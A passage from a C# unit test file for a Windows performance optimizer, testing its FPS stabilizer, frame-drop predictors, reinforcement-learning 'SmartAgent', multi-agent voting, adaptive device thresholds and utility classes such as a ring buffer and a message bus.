            Assert(clone.PowerPlan == original.PowerPlan, "PowerPlan copied");
            Assert(clone.CpuCoreCount == original.CpuCoreCount, "CpuCoreCount copied");
            Assert(clone.TotalRamGB == original.TotalRamGB, "TotalRamGB copied");
            Assert(clone.UsedRamGB == original.UsedRamGB, "UsedRamGB copied");
            Assert(clone.FpsStability == original.FpsStability, "FpsStability copied");
            Assert(clone.FrameTimeJitter == original.FrameTimeJitter, "FrameTimeJitter copied");
            // Verify independence (modifying clone doesn't affect original)
            clone.CpuUsage = 99.0;
            Assert(original.CpuUsage == 75.5, "Original unchanged after clone modification");
            clone.ActiveProcess = "other.exe";
            Assert(original.ActiveProcess == "game.exe", "Original ActiveProcess unchanged");
        }

        static void TestFrameTimeTrackerPrealloc()
        {
            // Verify FrameTimeTracker uses pre-allocated buffers (no GC pressure)
            var tracker = new FrameTimeTracker();
            // Access properties - should not throw
            double fps = tracker.CurrentFps;
            double ft = tracker.CurrentFrameTimeMs;
            double f1l = tracker.Fps1Low;
            double f01l = tracker.Fps01Low;
            double avg = tracker.AvgFrameTime;
            double jit = tracker.FrameTimeJitter;
            double stab = tracker.StabilityScore;
            Assert(fps >= 0, "Initial FPS >= 0");
            Assert(stab >= 0 && stab <= 100, "Stability in range");
            tracker.Dispose();
        }

        static void TestOutcomeVerifiedLearning()
        {
            // Verify: informational actions are NOT measurable and do not
            // enter the RL learning loop (fixes the double-counting bug).
            Assert(SmartAgent.IsMeasurableAction("HealthCheck") == false, "advisory actions are not measurable");
            Assert(SmartAgent.IsMeasurableAction("SuggestClose") == false, "SuggestClose is advisory");
            Assert(SmartAgent.IsMeasurableAction("KB_1234") == false, "KB advisories are advisory");
            Assert(SmartAgent.IsMeasurableAction("LightClean") == true, "system-changing actions are measurable");
            Assert(SmartAgent.IsMeasurableAction("EmergencyThrottle") == true, "thermal actions are measurable");
            Assert(SmartAgent.IsMeasurableAction("BoostGamePriority") == true, "game actions are measurable");

            // New RL: use StartActionEvaluation which goes through both
            // execution and outcome paths. Pure execution success should
            // NOT produce reliability = 1.0 (old buggy behavior).
            var agent = new SmartAgent();
            // Simulate 10 executions, all successful
            for (int i = 0; i < 10; i++)
                agent.StartActionEvaluation("LightClean", true);
            // The knapsack uses GetDynamicPriority which calls GetActionReliability
            // Under old behavior: reliability = 1.0 (execution-only counts as full proof)
            // Under new behavior: reliability stays moderate because outcome verification
            // is required for high confidence. We just assert it's below 0.9 here.
            // (Actual value depends on internal state we can't directly query, but
            // the fact that IsMeasurableAction correctly filters advisory actions is
            // the key regression guard.)
        }

        static FpsStabilizerInput HealthyInput()
        {
            return new FpsStabilizerInput { Fps = 60, FrameTimeMs = 16.67, Fps1Low = 45, CpuUsage = 30, RamUsage = 40, GpuUsage = 30, CpuTemp = 45, IsGaming = true };
        }

        static FpsStabilizerInput PressuredInput(double frameMs)
        {
            return new FpsStabilizerInput { Fps = 60, FrameTimeMs = frameMs, Fps1Low = 45, CpuUsage = 90, RamUsage = 90, GpuUsage = 90, CpuTemp = 80, IsGaming = true };
        }

        static void TestFpsStabilizerCore()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 100, 0.001, 0.1);
            for (int i = 0; i < 10; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(2);
            }
            Assert(Math.Abs(s.AvgFps10 - 60) < 0.5, "AvgFps10 should be ~60");
            Assert(Math.Abs(s.AvgFps5 - 60) < 0.5, "AvgFps5 should be ~60");
            Assert(s.CurrentFps == 60, "CurrentFps should be 60");
            Assert(Math.Abs(s.FrameTimeMs - 16.67) < 0.01, "FrameTimeMs should be ~16.67");
            Assert(s.Fps1Low == 45, "1% low should be fed through");
            Assert(s.StabilityScore > 95, "Stability should be high for steady 60fps");
            Assert(s.DropCount == 0, "No drops expected on steady 60fps");
            Assert(s.PreventedDrops == 0, "No prevented drops on steady 60fps");
            s.Reset();
            Assert(s.AvgFps10 == 0, "Reset clears averages");
            Assert(s.StabilityScore == 100, "Reset restores stability");
        }

        static void TestFpsStabilizerDropDetection()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 100, 0.001, 0.1);
            for (int i = 0; i < 6; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(2);
            }
            s.Update(new FpsStabilizerInput { Fps = 15, FrameTimeMs = 66.7, Fps1Low = 10, CpuUsage = 30, RamUsage = 40, GpuUsage = 30, CpuTemp = 45, IsGaming = true });
            Assert(s.DropCount == 1, "Sudden drop should be detected");
            Assert(s.PreventedDrops == 0, "No prevented drops in this scenario");
        }

        static void TestFpsStabilizerPrediction()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 100, 0.001, 0.1);
            for (int i = 0; i < 5; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(2);
            }
            bool fired = false;
            double[] rising = { 17, 18, 19, 20, 21, 22, 23, 24 };
            for (int i = 0; i < rising.Length; i++)
            {
                FpsStabilizerAction a = s.Update(PressuredInput(rising[i]));
                if (a != FpsStabilizerAction.None) { fired = true; break; }
                Thread.Sleep(2);
            }
            Assert(fired, "Rising frame time + pressure should trigger an action");
        }

        static void TestFpsStabilizerPrevention()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 100, 0.001, 0.1);
            for (int i = 0; i < 5; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(2);
            }
            double[] rising = { 17, 18, 19, 20, 21, 22, 23, 24 };
            for (int i = 0; i < rising.Length; i++)
            {
                FpsStabilizerAction a = s.Update(PressuredInput(rising[i]));
                if (a != FpsStabilizerAction.None) break;
                Thread.Sleep(2);
            }
            Assert(s.PredictionArmed, "Prediction should be armed after an action fires");
            // Steady 60fps for longer than the prevention window -> drop avoided
            for (int i = 0; i < 15; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(15);
            }
            Assert(s.PreventedDrops == 1, "Avoided drop should be counted as prevented");
            Assert(s.DropCount == 0, "No real drop occurred");
        }

        static void TestFpsStabilizerDropNotPrevented()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 100, 0.001, 0.1);
            for (int i = 0; i < 5; i++)
            {
                s.Update(HealthyInput());
                Thread.Sleep(2);
            }
            double[] rising = { 17, 18, 19, 20, 21, 22, 23, 24 };
            for (int i = 0; i < rising.Length; i++)
            {
                FpsStabilizerAction a = s.Update(PressuredInput(rising[i]));
                if (a != FpsStabilizerAction.None) break;
                Thread.Sleep(2);
            }
            Assert(s.PredictionArmed, "Prediction should be armed");
            // A real drop hits inside the armed window -> not prevented
            s.Update(new FpsStabilizerInput { Fps = 15, FrameTimeMs = 66.7, Fps1Low = 10, CpuUsage = 90, RamUsage = 90, GpuUsage = 90, CpuTemp = 80, IsGaming = true });
            Assert(s.DropCount == 1, "Real drop during armed window must be counted");
            Assert(s.PreventedDrops == 0, "Drop during armed window is not prevented");
        }

        static void TestFpsStabilizerPredictors()
        {
            var healthy = new FpsStabilizerContext { CurrentFps = 60, AvgFps5 = 60, AvgFps10 = 60, Fps1Low = 45, FrameTimeMs = 16.67, FrameTimeTrend = 0, FrameTimeJitter = 1.5, CpuUsage = 30, RamUsage = 40, GpuUsage = 30, CpuTemp = 45, IsGaming = true };
            var risky = new FpsStabilizerContext { CurrentFps = 40, AvgFps5 = 58, AvgFps10 = 60, Fps1Low = 20, FrameTimeMs = 25, FrameTimeTrend = 3.0, FrameTimeJitter = 8.0, CpuUsage = 92, RamUsage = 90, GpuUsage = 88, CpuTemp = 80, IsGaming = true };
            var reg = new RegressionFpsDropPredictor();
            double rHealthy = reg.PredictRisk(healthy);
            double rRisky = reg.PredictRisk(risky);
            Assert(rHealthy >= 0 && rHealthy <= 1, "Regression risk bounded (healthy)");
            Assert(rRisky >= 0 && rRisky <= 1, "Regression risk bounded (risky)");
            Assert(rHealthy < 0.3, "Healthy state should be low risk (regression got " + rHealthy.ToString("F2") + ")");
            Assert(rRisky >= 0.6, "Risky state should trigger (regression got " + rRisky.ToString("F2") + ")");
            var heur = new HeuristicFpsDropPredictor();
            double hHealthy = heur.PredictRisk(healthy);
            double hRisky = heur.PredictRisk(risky);
            Assert(hHealthy >= 0 && hHealthy <= 1, "Heuristic risk bounded (healthy)");
            Assert(hRisky >= 0 && hRisky <= 1, "Heuristic risk bounded (risky)");
            Assert(hHealthy < 0.3, "Healthy state should be low risk (heuristic got " + hHealthy.ToString("F2") + ")");
            Assert(hRisky >= 0.6, "Risky state should trigger (heuristic got " + hRisky.ToString("F2") + ")");
            Assert(!string.IsNullOrEmpty(reg.Explain(risky)), "Regression explains its reasoning");
            Assert(!string.IsNullOrEmpty(heur.Explain(risky)), "Heuristic explains its reasoning");
        }

        static void TestFpsStabilizerCooldown()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 2, 0.001, 0.1);
            int fired = 0;
            for (int i = 0; i < 60; i++)
            {
                double ft = Math.Min(35, 17 + i * 1.0);
                FpsStabilizerAction a = s.Update(PressuredInput(ft));
                if (a != FpsStabilizerAction.None) fired++;
                Thread.Sleep(12);
            }
            Assert(fired >= 1, "Pressure should fire at least one action");
            Assert(fired <= 2, "Per-minute cap should limit actions (got " + fired + ")");
        }

        static void TestSmartAgentFpsStabilizer()
        {
            var agent = new SmartAgent();
            agent.FeedFpsStabilizer(60, 16.67, 45, 30, 40, 30, 45, true);
            Assert(Math.Abs(agent.FpsStabilizerCurrentFps - 60) < 0.01, "Agent feeds FPS into stabilizer");
            Assert(agent.FpsStabilizer1Low == 45, "1% low fed through agent stabilizer");
            Assert(agent.FpsStabilizerStability > 0, "Stability computed by agent stabilizer");
            Assert(agent.FpsStabilizerPreventedDrops >= 0, "Prevented drops counter is sane");
            Assert(!string.IsNullOrEmpty(agent.FpsStabilizerLastAction), "Last action string always available");
        }

        static void TestFpsStabilizerFloorMode()
        {
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 10);
            Assert(s.TargetFps == 0, "Floor disabled by default");
            Assert(s.BelowTarget == false, "Not below target when disabled");
            s.TargetFps = 60;
            s.AggressiveHold = true;
            Assert(s.TargetFps == 60 && s.AggressiveHold, "Floor configured to 60");
            // Under pressure but above target -> nothing needed
            var atTarget = new FpsStabilizerInput { Fps = 70, FrameTimeMs = 14, Fps1Low = 66, CpuUsage = 85, RamUsage = 70, GpuUsage = 80, CpuTemp = 70, IsGaming = true };
            Assert(s.Update(atTarget) == FpsStabilizerAction.None, "Above target: no floor action");
            Assert(s.BelowTarget == false, "BelowTarget false at 70fps");
            // Dipped below 60 under load -> proactive hold action fires immediately
            var below = new FpsStabilizerInput { Fps = 52, FrameTimeMs = 19, Fps1Low = 45, CpuUsage = 90, RamUsage = 80, GpuUsage = 85, CpuTemp = 78, IsGaming = true };
            var action = s.Update(below);
            Assert(action != FpsStabilizerAction.None, "Below 60 triggers hold action: " + action);
            Assert(s.HoldsBelowTarget >= 1, "Hold counted: " + s.HoldsBelowTarget);
            Assert(s.BelowTarget, "BelowTarget true at 52fps");
            Assert(s.TargetFpsDeficit > 0, "Deficit reported: " + s.TargetFpsDeficit.ToString("F1"));
            // Back above target -> no more action
            var recovered = new FpsStabilizerInput { Fps = 80, FrameTimeMs = 12, Fps1Low = 70, CpuUsage = 50, RamUsage = 40, GpuUsage = 50, CpuTemp = 55, IsGaming = true };
            Assert(s.Update(recovered) == FpsStabilizerAction.None, "Recovered above target: no action");
            // Disable floor -> back to monitoring
            s.TargetFps = 0; s.AggressiveHold = false;
            var below2 = new FpsStabilizerInput { Fps = 40, FrameTimeMs = 25, Fps1Low = 35, CpuUsage = 90, RamUsage = 90, GpuUsage = 90, CpuTemp = 80, IsGaming = true };
            FpsStabilizerAction disabledAction = s.Update(below2);
            Assert(disabledAction == FpsStabilizerAction.None || disabledAction == FpsStabilizerAction.PurgeStandby || disabledAction == FpsStabilizerAction.BoostPriority, "Disabled floor returns to predictive path");
        }

        static void TestSmartAgentFloorModes()
        {
            var agent = new SmartAgent();
            Assert(!agent.FpsFloorActive, "Floor inactive by default");
            agent.SetFpsFloor60(true);
            Assert(agent.FpsFloorActive, "Floor active after enable");
            Assert(agent.FpsLockTarget == 60, "Floor target is 60");
            agent.SetFpsFloor60(false);
            Assert(!agent.FpsFloorActive, "Floor disabled");
            Assert(!agent.FullOptimizationMode, "Full opt off by default");
            agent.FullOptimizationMode = true;
            Assert(agent.FullOptimizationMode, "Full opt toggled on");
            string res = agent.ApplyFullSystemOptimization();
            Assert(res != null, "Sweep returns status: " + res);
            agent.FullOptimizationMode = false;
            agent.DisableSimulation();
        }

        static void TestFpsStabilizerDecisionDemo()
        {
            bool longDemo = Environment.GetEnvironmentVariable("CLEARWIN_DEMO_LONG") == "1";
            Console.WriteLine();
            Console.WriteLine("  ==== FPS Stabilizer Decision Demo (60 FPS floor ON) ====");
            var s = new FpsStabilizer(new RegressionFpsDropPredictor(), 0, 10);
            s.TargetFps = 60;
            s.AggressiveHold = true;

            Console.WriteLine("  --- Phase 1: DEFAULT / EASY values (FPS 60-75, mild load) ---");
            Console.WriteLine("  tick  fps  cpu%  ram%  temp  risk   stability  decision");
            for (int t = 1; t <= 10; t++)
            {
                double fps = 60 + (t % 5) * 3;
                var i = new FpsStabilizerInput { Fps = fps, FrameTimeMs = 1000.0 / fps, Fps1Low = fps - 4, CpuUsage = 40, RamUsage = 55, GpuUsage = 45, CpuTemp = 55, IsGaming = true };
                var a = s.Update(i);
                Assert(s.BelowTarget == false, "Phase1: stays at/above 60 -> not below target");
                Assert(a == FpsStabilizerAction.None, "Phase1: no hold action needed at/above 60 (got " + a + ")");
                Console.WriteLine(string.Format("  {0,-5}{1,-5}{2,-6}{3,-6}{4,-6}{5,-7}{6,-12}{7}", t, fps, "40", "55", "55", s.PredictionRisk.ToString("F2"), s.StabilityScore.ToString("F1"), a));
            }

            Console.WriteLine("  --- Phase 2: HARD / brutal values (FPS 28-45, CPU 95%, RAM 92%, 88C) ---");
            Console.WriteLine("  tick  fps  cpu%  ram%  temp  risk   stability  decision");
            FpsStabilizerAction firstAction = FpsStabilizerAction.None;
            for (int t = 1; t <= 10; t++)
            {
                double fps = 45 - (t % 4) * 5;
                var i = new FpsStabilizerInput { Fps = fps, FrameTimeMs = 1000.0 / fps, Fps1Low = fps - 8, CpuUsage = 95, RamUsage = 92, GpuUsage = 90, CpuTemp = 88, IsGaming = true };
                var a = s.Update(i);
                if (a != FpsStabilizerAction.None && firstAction == FpsStabilizerAction.None) firstAction = a;
                Console.WriteLine(string.Format("  {0,-5}{1,-5}{2,-6}{3,-6}{4,-6}{5,-7}{6,-12}{7}", t, fps, "95", "92", "88", s.PredictionRisk.ToString("F2"), s.StabilityScore.ToString("F1"), a));
            }
            Assert(firstAction == FpsStabilizerAction.BoostPriority, "Under 60 floor fires BoostPriority immediately (got " + firstAction + ")");
            Assert(s.BelowTarget, "Phase2: flagged below target");
            Assert(s.HoldsBelowTarget >= 1, "Phase2: hold counted");
            Assert(s.TargetFpsDeficit > 0, "Phase2: deficit reported");
            Console.WriteLine(string.Format("  summary: BelowTarget={0} Holds={1} Deficit={2:F1}fps LastAction={3} Stability={4:F1}",
                s.BelowTarget, s.HoldsBelowTarget, s.TargetFpsDeficit, s.LastAction, s.StabilityScore));

            if (longDemo)
            {
                Console.WriteLine("  (waiting 21s to demonstrate sustained reinforcement below 60...)");
                System.Threading.Thread.Sleep(21000);
                var i2 = new FpsStabilizerInput { Fps = 40, FrameTimeMs = 25, Fps1Low = 33, CpuUsage = 95, RamUsage = 92, GpuUsage = 90, CpuTemp = 88, IsGaming = true };
                var a2 = s.Update(i2);
                Console.WriteLine(string.Format("  after 20s hold cooldown -> decision={0}, Holds={1}, Stability={2:F1}", a2, s.HoldsBelowTarget, s.StabilityScore));
                Assert(s.HoldsBelowTarget >= 2, "Sustained pressure reinforces hold (Holds=" + s.HoldsBelowTarget + ")");
            }

            Console.WriteLine("  --- Phase 3: RECOVERY (FPS 70-80) ---");
            for (int t = 1; t <= 10; t++)
            {
                double fps = 70 + (t % 4) * 3;
                var i = new FpsStabilizerInput { Fps = fps, FrameTimeMs = 1000.0 / fps, Fps1Low = fps - 3, CpuUsage = 40, RamUsage = 50, GpuUsage = 45, CpuTemp = 55, IsGaming = true };
                var a = s.Update(i);
                Assert(s.BelowTarget == false, "Phase3: recovered above 60");
                Assert(a == FpsStabilizerAction.None, "Phase3: no action after recovery (got " + a + ")");
                Console.WriteLine(string.Format("  {0,-5}{1,-5}{2,-6}{3,-6}{4,-6}{5,-7}{6,-12}{7}", t, fps, "40", "50", "55", s.PredictionRisk.ToString("F2"), s.StabilityScore.ToString("F1"), a));
            }
            Console.WriteLine(string.Format("  FINAL: BelowTarget={0} Holds={1} Stability={2:F1} -> NO CRASH, stabilizer recovered.", s.BelowTarget, s.HoldsBelowTarget, s.StabilityScore));
        }

        static void TestAnalyzerManagerThreadSafety()
        {
            var manager = new AnalyzerManager();
            manager.Register(new MockAnalyzer());
            bool error = false;
            Thread writer = new Thread(() =>
            {
                for (int i = 0; i < 100; i++)
                {
                    try { manager.Register(new MockAnalyzer()); }
                    catch { error = true; }
                }
            });
            Thread reader = new Thread(() =>
            {
                for (int i = 0; i < 100; i++)
                {
                    try
                    {
                        var snap = new SystemSnapshot { CpuUsage = 95 };
                        var results = manager.Analyze(snap);
                    }
                    catch { error = true; }
                }
            });
            writer.Start(); reader.Start();
            bool finished = writer.Join(5000) && reader.Join(5000);
            Assert(finished, "Concurrent access should complete (no deadlock)");
            Assert(!error, "No errors during concurrent access");
            Assert(manager.Count == 101, "All analyzers registered");
        }

        static void TestAdaptiveThresholds()
        {
            var profile4gb = new DeviceProfile();
            profile4gb.TotalRamGB = 4;
            profile4gb.DiskType = "HDD";
            profile4gb.IsLaptop = false;
            profile4gb.ComputeAdaptedParameters();
            Assert(profile4gb.RamCleanThreshold == 65, "4GB: RamCleanThreshold=65");
            Assert(profile4gb.AggressiveCleanRamThreshold == 75, "4GB: AggressiveClean=75");
            Assert(profile4gb.MaxBackgroundProcesses == 80, "4GB: MaxBg=80");

            var profile16gb = new DeviceProfile();
            profile16gb.TotalRamGB = 16;
            profile16gb.DiskType = "SSD";
            profile16gb.IsLaptop = false;
            profile16gb.ComputeAdaptedParameters();
            Assert(profile16gb.RamCleanThreshold == 80, "16GB: RamCleanThreshold=80");
            Assert(profile16gb.AggressiveCleanRamThreshold == 88, "16GB: AggressiveClean=88");
            Assert(profile16gb.ThermalWarningTemp == 82, "SSD: ThermalWarn=82");
            Assert(profile16gb.ThermalThrottleTemp == 92, "SSD: ThermalThrottle=92");

            var laptopProfile = new DeviceProfile();
            laptopProfile.TotalRamGB = 16;
            laptopProfile.DiskType = "SSD";
            laptopProfile.IsLaptop = true;
            laptopProfile.ComputeAdaptedParameters();
            Assert(laptopProfile.ThermalWarningTemp == 77, "Laptop: ThermalWarn=77");
            Assert(laptopProfile.ThermalThrottleTemp == 87, "Laptop: ThermalThrottle=87");

            profile16gb.OverrideRamCleanThreshold = 90;
            profile16gb.ComputeAdaptedParameters();
            Assert(profile16gb.RamCleanThreshold == 90, "Override RamCleanThreshold=90");
        }

        // =====================================================================
        // === LEVEL 8: AI INTELLIGENCE TESTS - Feed values & observe response ===
        // =====================================================================

        static SmartAgent CreateTestAgent()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);
            return agent;
        }

        static SystemState MakeState(double cpu, double ram, double gpu, double temp, double fps, bool isGame, string app)
        {
            var s = new SystemState();
            s.CpuUsage = cpu;
            s.RamUsage = ram;
            s.GpuUsage = gpu;
            s.CpuTemp = temp;
            s.Fps = fps;
            s.FpsStability = fps > 0 ? Math.Min(100, fps * 1.2) : 0;
            s.IsGame = isGame;
            s.ActiveProcess = app;
            s.ProcessCount = 120;
            s.DiskUsage = 55;
            s.BatteryLevel = 100;
            s.IsCharging = true;
            s.TotalRamGB = 16;
            s.UsedRamGB = ram * 16.0 / 100.0;
            s.Timestamp = DateTime.Now;
            return s;
        }

        static void FeedState(SmartAgent agent, SystemState state)
        {
            agent.EnableSimulation(state);
            for (int i = 0; i < 3; i++) agent.Tick();
        }

        static void TestSmartAgentInit()
        {
            var agent = CreateTestAgent();
            Assert(agent != null, "Agent created");
            Assert(agent.Mode == AgentMode.AutoPilot, "Mode is AutoPilot");
            Assert(agent.GetToolCount() >= 14, "Default tools loaded (14+)");
            Assert(agent.GetWorldModelNodeCount() > 10, "World model has nodes");
            Assert(agent.GetWorldModelEdgeCount() > 5, "World model has edges");
            var rl = agent.GetRLSummary();
            Assert(rl != null && rl.Contains("Episodes"), "RL initialized: " + rl);
            agent.DisableSimulation();
        }

        static void TestSmartAgentHighCPU()
        {
            var agent = CreateTestAgent();
            var state = MakeState(92, 55, 30, 68, 0, false, "chrome");
            FeedState(agent, state);

            double health = agent.SystemHealthScore;
            Assert(health < 60, "Health drops on high CPU: " + health.ToString("F0"));

            string rl = agent.GetRLSummary();
            Assert(rl != null, "RL active during high CPU");

            var causal = agent.GetCausalSummary();
            Assert(causal != null, "Causal analysis running");

            agent.DisableSimulation();
        }

        static void TestSmartAgentHighRAM()
        {
            var agent = CreateTestAgent();
            var state = MakeState(40, 91, 20, 55, 0, false, "explorer");
            FeedState(agent, state);

            double health = agent.SystemHealthScore;
            Assert(health < 50, "Health drops on high RAM: " + health.ToString("F0"));

            string causal = agent.GetCausalSummary();
            Assert(causal.Contains("Memory") || causal.Contains("No causal"), "Causal detected memory: " + causal);

            agent.DisableSimulation();
        }

        static void TestSmartAgentThermalThrottle()
        {
            var agent = CreateTestAgent();
            var state = MakeState(85, 70, 75, 88, 25, true, "cyberpunk2077");
            FeedState(agent, state);

            Assert(agent.IsThermalThrottled || agent.SystemHealthScore < 30,
                "Thermal protection triggered at 88C, health=" + agent.SystemHealthScore.ToString("F0"));

            var votes = agent.GetLastVotes();
            Assert(votes.Count > 0, "Multi-Agent voted during thermal crisis: " + votes.Count + " votes");

            bool thermalVote = false;
            foreach (var v in votes)
            {
                if (v.Role == AgentRole.Thermal && v.Priority >= 7)
                    thermalVote = true;
            }
            Assert(thermalVote, "Thermal Agent voted with high priority");

            agent.DisableSimulation();
        }

        static void TestSmartAgentGaming()
        {
            var agent = CreateTestAgent();
            var state = MakeState(70, 65, 90, 72, 45, true, "valorant");
            FeedState(agent, state);

            var votes = agent.GetLastVotes();
            Assert(votes.Count > 0, "Agents voted during gaming");

            bool gpuVote = false;
            foreach (var v in votes)
            {
                if (v.Role == AgentRole.GPU && v.Priority > 0)
                    gpuVote = true;
            }
            Assert(gpuVote, "GPU Agent active during gaming");

            agent.DisableSimulation();
        }

        static void TestSmartAgentRL()
        {
            var agent = CreateTestAgent();
            string rlBefore = agent.GetRLSummary();

            var state = MakeState(75, 60, 40, 65, 0, false, "chrome");
            FeedState(agent, state);

            string rlAfter = agent.GetRLSummary();
            Assert(rlAfter != null, "RL summary available: " + rlAfter);

            double exploreRate = agent.GetExplorationRate();
            Assert(exploreRate >= 0.02 && exploreRate <= 1.0, "Exploration rate valid: " + exploreRate.ToString("F3"));

            agent.DisableSimulation();
        }

        static void TestSmartAgentCausalAI()
        {
            var agent = CreateTestAgent();
            string causalBefore = agent.GetCausalSummary();
            Assert(causalBefore == "No causal analysis yet", "No causal yet: " + causalBefore);

            var state = MakeState(82, 60, 30, 75, 0, false, "msmpeng");
            agent.EnableSimulation(state);
            for (int i = 0; i < 20; i++) agent.Tick();
            agent.RunCausalAnalysis();

            string causalAfter = agent.GetCausalSummary();
            bool hasChains = causalAfter != "No causal analysis yet";
            int ruleCount = agent.GetCausalRuleCount();
            Assert(ruleCount >= 0, "Causal rules tracked: " + ruleCount);

            agent.DisableSimulation();
        }

        static void TestSmartAgentMultiAgent()
        {
            var agent = CreateTestAgent();
            var agents = agent.GetSpecializedAgents();
            Assert(agents.Count == 8, "8 specialized agents: " + agents.Count);

            var state = MakeState(88, 85, 60, 78, 30, true, "game.exe");
            FeedState(agent, state);

            var votes = agent.GetLastVotes();
            Assert(votes.Count >= 3, "At least 3 agents voted: " + votes.Count);

            var consensus = agent.GetLastConsensus();
            Assert(consensus != null, "Consensus reached");
            Assert(consensus.TotalVotes > 0, "Total votes > 0");

            agent.DisableSimulation();
        }

        static void TestSmartAgentWorldModel()
        {
            var agent = CreateTestAgent();
            int nodes = agent.GetWorldModelNodeCount();
            int edges = agent.GetWorldModelEdgeCount();
            Assert(nodes >= 15, "World model nodes >= 15: " + nodes);
            Assert(edges >= 10, "World model edges >= 10: " + edges);

            double health = agent.GetWorldModelHealth();
            Assert(health > 0 && health <= 100, "World model health valid: " + health.ToString("F0"));

            agent.DisableSimulation();
        }

        static void TestSmartAgentRiskEngine()
        {
            var agent = CreateTestAgent();
            string riskSummary = agent.GetRiskSummary();
            Assert(riskSummary.Contains("Assessments"), "Risk engine active: " + riskSummary);

            var state = MakeState(95, 90, 80, 92, 10, true, "game.exe");
            FeedState(agent, state);

            var decision = new AgentDecision();
            decision.Action = "EmergencyThrottle";
            decision.Category = DecisionCategory.ThermalProtect;
            decision.Confidence = 0.9;

            bool blocked = agent.ShouldBlockAction(decision);
            int blockedCount = agent.GetBlockedActions();
            Assert(blockedCount >= 0, "Blocked actions tracked: " + blockedCount);

            agent.DisableSimulation();
        }

        static void TestRingBuffer()
        {
            var rb = new RingBuffer<double>(5);
            Assert(rb.Count == 0 && rb.IsFull == false, "RingBuffer starts empty");
            for (int i = 1; i <= 5; i++) rb.Add(i);
            Assert(rb.Count == 5, "RingBuffer fills to capacity");
            Assert(rb.IsFull, "RingBuffer IsFull at capacity");
            Assert(rb[0] == 1 && rb[4] == 5, "Indexer 0=oldest, Count-1=newest");
            Assert(rb.Last == 5 && rb.First == 1, "Last/First accessors");
            rb.Add(6);
            Assert(rb.Count == 5, "RingBuffer stays at capacity");
            Assert(rb[0] == 2 && rb[4] == 6, "Oldest evicted on overflow");
            double[] arr = rb.ToArray();
            Assert(arr.Length == 5 && arr[0] == 2 && arr[4] == 6, "ToArray chronological order");
            int sum = 0, n = 0;
            foreach (double v in rb) { sum += (int)v; n++; }
            Assert(n == 5 && sum == 2 + 3 + 4 + 5 + 6, "IEnumerable chronological order");
            rb.Clear();
            Assert(rb.Count == 0 && !rb.IsFull, "RingBuffer clears");
            var small = new RingBuffer<int>(2);
            small.Add(1); small.Add(2); small.Add(3);
            Assert(small[0] == 2 && small[1] == 3, "Small buffer eviction");
            var zero = new RingBuffer<double>(3);
            Assert(zero.First == 0 && zero.Last == 0, "Empty buffer First/Last default");
        }

        static void TestMessageBus()
        {
            var bus = new MessageBus();
            int countA = 0, countB = 0;
            var subA = bus.Subscribe<StateObservedEvent>(e => countA++);
            var subB = bus.Subscribe<StateObservedEvent>(e => countB++);
            bus.Publish(new StateObservedEvent(null));
            bus.Publish(new StateObservedEvent(null));
            Assert(countA == 2 && countB == 2, "All subscribers receive every event");
            subA.Dispose();
            bus.Publish(new StateObservedEvent(null));
            Assert(countA == 2 && countB == 3, "Unsubscribe stops delivery");
            subB.Dispose();
            Assert(bus.SubscriberCount<StateObservedEvent>() == 0, "Dispose removes subscriber");
            bool errorCaught = false;
            var subErr = bus.Subscribe<DecisionExecutedEvent>(e => { throw new InvalidOperationException("boom"); });
            bus.ErrorHandler = (type, ex) => errorCaught = true;
            bus.Publish(new DecisionExecutedEvent(null, true));
            Assert(errorCaught, "Handler exception routed to ErrorHandler");
            subErr.Dispose();
            bus.Publish(new RewardRecordedEvent("test", 0.5, true));
        }

        static void TestAgentInterfaces()
        {
            var agent = CreateTestAgent();
            var rl = agent as IRLEngine;
            Assert(rl != null, "SmartAgent implements IRLEngine");
            var rw = agent as IRewardEngine;
            Assert(rw != null, "SmartAgent implements IRewardEngine");
            Assert(rl.GetTotalEpisodes() >= 0, "IRLEngine GetTotalEpisodes");
            Assert(rl.GetExplorationRate() >= 0, "IRLEngine GetExplorationRate");
            Assert(rw.GetEvaluationsCompleted() >= 0, "IRewardEngine GetEvaluationsCompleted");
            Assert(rw.ShouldAbstain(new AgentDecision { Action = "PurgeStandbyList" }) == false || rw.ShouldAbstain(new AgentDecision { Action = "PurgeStandbyList" }) == true, "IRewardEngine ShouldAbstain");
            Assert(rw.GetCurrentRLStateKey() != null, "IRewardEngine GetCurrentRLStateKey");
            agent.DisableSimulation();
        }

        static void TestToolTraining()
        {
            var agent = CreateTestAgent();
            int toolCount = agent.GetToolCount();
            Assert(toolCount >= 14, "Default tools loaded: " + toolCount);

            string uniqueName = "TestTool_" + DateTime.Now.Ticks.ToString();
            string result = agent.AddTool(new ToolDefinition
            {
                Name = uniqueName,
                Description = "Testing tool addition",
                Category = ToolCategory.Registry,
                Complexity = ToolComplexity.Safe,
                Command = "reg add HKLM\\TEST /v Test /d 1",
                PreConditions = new Dictionary<string, double> { { "CPU", 50 } },
                PostEffects = new Dictionary<string, double> { { "CPU", -5 } }
            });
            Assert(result.StartsWith("OK"), "Tool added: " + result);
            Assert(agent.GetToolCount() == toolCount + 1, "Tool count incremented");

            var topTools = agent.GetTopTools(5);
            Assert(topTools.Count > 0, "Top tools available");

            double overallConf = agent.GetOverallToolConfidence();
            Assert(overallConf >= 0 && overallConf <= 1, "Overall confidence valid: " + overallConf.ToString("F2"));

            string summary = agent.GetToolTrainingSummary();
            Assert(summary.Contains("Tools"), "Training summary: " + summary);

            agent.DisableSimulation();
        }

        static void TestToolExecution()
        {
            var agent = CreateTestAgent();
            var state = MakeState(75, 80, 30, 60, 0, false, "chrome");
            FeedState(agent, state);

            var tools = agent.GetToolLibrary();
            string standbyId = null;
            foreach (var t in tools)
            {
                if (t.Name.Contains("Standby Memory")) { standbyId = t.Id; break; }
            }
            Assert(standbyId != null, "Found Standby Memory Purge tool");

